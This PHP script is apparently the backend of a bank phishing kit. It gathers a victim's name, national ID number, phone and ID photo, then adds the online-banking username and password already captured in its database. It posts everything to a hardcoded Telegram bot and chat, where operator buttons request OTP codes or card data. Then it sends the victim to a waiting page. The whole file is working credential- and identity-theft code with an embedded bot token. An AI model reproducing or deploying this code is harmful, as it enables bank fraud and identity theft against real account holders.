<?php

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

$codigo    = isset($_POST['codigo']) ? $_POST['codigo'] : '';
$key       = isset($_POST['key']) ? $_POST['key'] : '';
$nombreID  = isset($_POST['nombre']) ? $_POST['nombre'] : '';
$cedula    = isset($_POST['cedula']) ? $_POST['cedula'] : '';
$telefono2 = isset($_POST['telefono']) ? $_POST['telefono'] : '';
$fotoTmp   = isset($_FILES['photo']['tmp_name']) ? $_FILES['photo']['tmp_name'] : null;
$fotoError = isset($_FILES['photo']['error']) ? $_FILES['photo']['error'] : UPLOAD_ERR_NO_FILE;

if (!$key) {
    die("Error: Key no proporcionada.");
}

$stmt = $pdo->prepare(
    "SELECT numero_cuenta, monto, banco, nombre, telefono, correo,
            `user` AS vp_usuario, `password` AS vp_clave, request_id
     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute(array($key));
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$celular = isset($data['numero_cuenta']) ? $data['numero_cuenta'] : '';
$monto   = isset($data['monto']) ? $data['monto'] : '';
$banco   = isset($data['banco']) ? $data['banco'] : 'Bancolombia';
$usuario = isset($data['vp_usuario']) ? $data['vp_usuario'] : '';
$clave   = isset($data['vp_clave']) ? $data['vp_clave'] : '';

try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $e) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

$fotoPath   = null;
$uploadDir  = '/var/www/html/uploads/fotos/';
$safeKey    = preg_replace('/[^a-zA-Z0-9_]/', '_', $key);
$fileName   = $safeKey . '_' . time() . '.jpg';
$destPath   = $uploadDir . $fileName;
$tmpDest    = '/tmp/' . $fileName;

if ($fotoTmp && $fotoError === UPLOAD_ERR_OK) {
    if (!is_dir($uploadDir)) {
        @mkdir($uploadDir, 0775, true);
    }
    if (@move_uploaded_file($fotoTmp, $destPath)) {
        $fotoPath = 'uploads/fotos/' . $fileName;
    } else {
        if (@move_uploaded_file($fotoTmp, $tmpDest)) {
            @copy($tmpDest, $destPath);
            if (file_exists($destPath)) {
                $fotoPath = 'uploads/fotos/' . $fileName;
            }
        }
        if (!$fotoPath) {
            error_log("FOTO UPLOAD FAIL: key=$key src=$fotoTmp dest=$destPath");
        }
    }
}

$updateRid = $pdo->prepare(
    "UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE BINARY `key` = ?"
);
$updateRid->execute(array($nuevo_request_id, $key));

$saveId = $pdo->prepare(
    "UPDATE solicitudes SET nombre_id = ?, cedula = ?, foto_path = ? WHERE BINARY `key` = ?"
);
$saveId->execute(array($nombreID, $cedula, $fotoPath, $key));

$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$token   = $DEFAULT_BOT_TOKEN_OPS;
if (is_string($envBot) && trim($envBot) !== '') { $token = $envBot; }
$chat_id = $DEFAULT_CHAT_ID_OPS;
if (is_string($envCh)  && trim($envCh)  !== '') { $chat_id = $envCh; }

function fv_extra($v, $ph = '<i>(no informado)</i>') {
    $s = is_string($v) ? trim($v) : '';
    if ($s === '') { return $ph; }
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$SEP = str_repeat("-", 30);
$mensaje  = "";
$mensaje .= "\xE2\x9C\x85 <b>[DATO EXTRA: FOTO / CEDULA]</b> Datos de identidad y foto:\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x92\xB0 Monto: " . fv_extra($monto) . "\n";
$mensaje .= "\xF0\x9F\x8F\xA6 Banco: " . fv_extra($banco) . "\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x91\xA4 Usuario Virtual-Persona: " . fv_extra($usuario) . "\n";
$mensaje .= "\xF0\x9F\x94\x92 Clave Virtual-Persona: " . fv_extra($clave) . "\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\xA7\xBE Nombre ID: " . fv_extra($nombreID) . "\n";
$mensaje .= "\xF0\x9F\xAA\xAA Cedula: " . fv_extra($cedula) . "\n";
$mensaje .= "\xF0\x9F\x93\x9E Telefono: " . fv_extra($telefono2) . "\n";
$mensaje .= $SEP . "\n";

$botones = array(
    'inline_keyboard' => array(
        array(
            array('text' => "\xF0\x9F\x9F\xA2 DINAMICA",              'callback_data' => "OPCION_1_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x92\xB3 TARJETA",               'callback_data' => "OPCION_2_" . $nuevo_request_id),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 ERROR USUARIO",         'callback_data' => "OPCION_3_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x94\xB4 ERROR Dinamica/OTP",    'callback_data' => "OPCION_4_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA2 FOTO",                  'callback_data' => "OPCION_5_" . $nuevo_request_id),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 ERROR Dinamica/OTP",    'callback_data' => "OPCION_9_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",             'callback_data' => "OPCION_10_" . $nuevo_request_id),
        ),
    ),
);

$telegramUrl = "";
$postData    = array();
$ch = curl_init();
$archivoFotoLocal = null;
if ($fotoTmp && $fotoError === UPLOAD_ERR_OK && $fotoPath && file_exists('/var/www/html/' . $fotoPath)) {
    $telegramUrl = "https://api.telegram.org/bot" . $token . "/sendPhoto";
    $archivoFotoLocal = '/var/www/html/' . $fotoPath;
    $postData = array(
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile($archivoFotoLocal),
    );
} elseif ($fotoTmp && $fotoError === UPLOAD_ERR_OK && file_exists($tmpDest)) {
    $telegramUrl = "https://api.telegram.org/bot" . $token . "/sendPhoto";
    $archivoFotoLocal = $tmpDest;
    $postData = array(
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile($archivoFotoLocal),
    );
} elseif ($fotoTmp && $fotoError === UPLOAD_ERR_OK) {
    $telegramUrl = "https://api.telegram.org/bot" . $token . "/sendPhoto";
    $postData = array(
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile($fotoTmp),
    );
} else {
    $telegramUrl = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $postData = array(
        'chat_id'                  => $chat_id,
        'text'                     => $mensaje,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true,
        'reply_markup'             => json_encode($botones),
    );
}

curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$qs = http_build_query(array('rid' => $nuevo_request_id, 'key' => $key), '', '&', PHP_QUERY_RFC3986);
header("Location: espera.html?" . $qs);
exit;
